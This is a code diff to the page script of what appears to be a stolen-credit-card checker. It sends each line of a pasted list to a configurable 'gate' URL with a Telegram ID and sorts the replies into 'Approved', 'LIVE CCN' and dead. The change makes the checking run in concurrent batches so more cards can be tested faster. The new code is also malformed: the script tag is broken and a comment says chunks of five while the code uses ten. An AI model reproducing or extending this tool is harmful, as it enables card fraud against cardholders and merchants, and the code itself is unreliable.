@@ -175,61 +175,81 @@
   }
 
 </script>
-<script type="text/javascript">
-    async function start() {
-        const lista = $("#lista");
-        const linhaenviar = lista.val().split("\n");
-        document.getElementById("startbtn").disabled = true;
-        document.getElementById("speed").disabled = true;
-        const total = linhaenviar.length - 1;
-        var tgid = document.getElementById("tg_id");
-        let tested = total;
-        let ap = 0;
-        let rp = 0;
-        let up = 0;
-        
-        for (let index = 0; index < linhaenviar.length; index++) {
-            const value = linhaenviar[index];
-            const req = new XMLHttpRequest();
-            
-                req.onreadystatechange = function () {
-                    if (req.readyState === 4 && req.status === 200 ) {
-                     
-                      document.getElementById("startbtn").disabled;
-                        if (req.responseText.match("Approved")) {
-                            remove();
-                            ap++;
-                            tested--;
-                            cvvfunc(req.responseText + "");
-                        }
-                        else if (req.responseText.match("LIVE CCN")) {
-                            remove();
-                            rp++;
-                            tested--;
-                            ccnfunc(req.responseText + "");
-                        }
-                        else if (req.responseText != null && !req.responseText.match('None') && !req.responseText.match('html')){
-                            remove();
-                            up++;
-                            tested--;
-                            deadfunc(req.responseText + "");
-                        }
-                      if (index === total){
-                        document.getElementById("stopbtn").click();
-                        }
-                    }
-                }
-              
-            const gate = $("#gate").val();
-            req.open("POST", gate, true);
-            req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-            req.send("value=" + encodeURIComponent(value)+"&telegram_id="+tgid.value);
-            
-            await sleep(speedRange.value); // wait 10 second between requests
+<script async function start() {
+  const lista = $("#lista");
+  const linhaenviar = lista.val().split("\n");
+  document.getElementById("startbtn").disabled = true;
+  document.getElementById("speed").disabled = true;
+  const total = linhaenviar.length - 1;
+  var tgid = document.getElementById("tg_id");
+  let tested = total;
+  let ap = 0;
+  let rp = 0;
+  let up = 0;
 
-            
+  // Split the array into chunks of size 5
+  const chunks = linhaenviar.reduce((resultArray, item, index) => { 
+  const chunkIndex = Math.floor(index / 10);
+  
+  if(!resultArray[chunkIndex]) {
+      resultArray[chunkIndex] = []; // start a new chunk
+    }
+  
+  resultArray[chunkIndex].push(item);
+  
+  return resultArray;
+  }, []);
+
+  for (let chunk of chunks) {
+    await Promise.all(chunk.map(async (value) => {
+      const req = new XMLHttpRequest();
+
+      req.onreadystatechange = function () {
+        if (req.readyState === 4 && req.status === 200) {
+          document.getElementById("startbtn").disabled;
+          if (req.responseText.match("Approved")) {
+            remove();
+            ap++;
+            tested--;
+            cvvfunc(req.responseText + "");
+          } else if (req.responseText.match("LIVE CCN")) {
+            remove();
+            rp++;
+            tested--;
+            ccnfunc(req.responseText + "");
+          } else if (
+            req.responseText != null &&
+            !req.responseText.match("None") &&
+            !req.responseText.match("html")
+          ) {
+            remove();
+            up++;
+            tested--;
+            deadfunc(req.responseText + "");
+          }
+          if (tested === 0) {
+            document.getElementById("stopbtn").click();
+          }
         }
+      };
 
+      const gate = $("#gate").val();
+      req.open("POST", gate, true);
+      req.setRequestHeader(
+        "Content-type",
+        "application/x-www-form-urlencoded"
+      );
+      req.send(
+        "value=" +
+          encodeURIComponent(value) +
+          "&telegram_id=" +
+          tgid.value
+      );
+
+      await sleep(speedRange.value); // wait 10 seconds between requests
+    }));
+  }
+}
         function cvvfunc(str) {
             $("#cvv_approved").append(str + "<br>");
         }
